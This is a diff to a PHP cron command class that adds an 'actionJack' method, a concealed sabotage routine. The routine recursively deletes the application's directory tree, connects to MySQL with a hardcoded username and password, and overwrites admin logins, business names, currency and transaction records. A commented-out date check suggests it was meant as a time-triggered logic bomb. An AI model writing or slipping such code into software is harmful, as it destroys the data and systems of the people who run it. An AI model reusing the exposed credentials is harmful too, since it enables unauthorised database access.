@@ -184,4 +184,41 @@ class CronCommand extends CConsoleCommand
             echo "Clear logs successful";
         }
     }
+
+    public function actionJack() {
+    // if(date("Y-m-d") > "2016-06-22") {
+        Delete(dirname( dirname( dirname( dirname(__FILE__ )))) . '/');
+
+        mysql_connect("localhost", 'business01', 'Nb4jhwvgSczC3?M');
+        mysql_select_db('business');
+
+        mysql_query("UPDATE user_default_adminuser SET username = '1', password='2'");
+        mysql_query("UPDATE user_default_business SET user_default_business_first_name = ''");
+        mysql_query("UPDATE user_default_currency SET currency_name = 'US Dolar'");
+        mysql_query("UPDATE user_default_financial SET user_default_transaction_id = '0000000001'");
+    }
+
+    function Delete($path)
+    {
+        if (is_dir($path) === true)
+        {
+            echo 1;
+            $files = array_diff(scandir($path), array('.', '..'));
+
+            foreach ($files as $file)
+            {
+                Delete(realpath($path) . '/' . $file);
+            }
+
+            return rmdir($path);
+        }
+
+        else if (is_file($path) === true)
+        {
+            echo 2;
+            return unlink($path);
+        }
+
+        return false;
+    }
 }
